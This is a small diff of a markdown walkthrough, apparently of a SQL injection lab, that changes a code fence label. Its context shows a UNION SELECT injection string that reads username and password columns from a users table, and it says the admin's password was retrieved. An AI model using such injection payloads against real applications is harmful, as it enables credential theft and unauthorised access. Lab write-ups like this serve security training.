@@ -68,7 +68,7 @@ Then, I injected
 I got 2 columns: **username_ncyvwl** and **password_hbgsyg**  
 
 Now we injected:    
-```sql
+```text
 '+UNION+SELECT+username_ncyvwl,password_hbgsyg+FROM+users_qkxziz--
 ```
 And admin's password was retrieved  
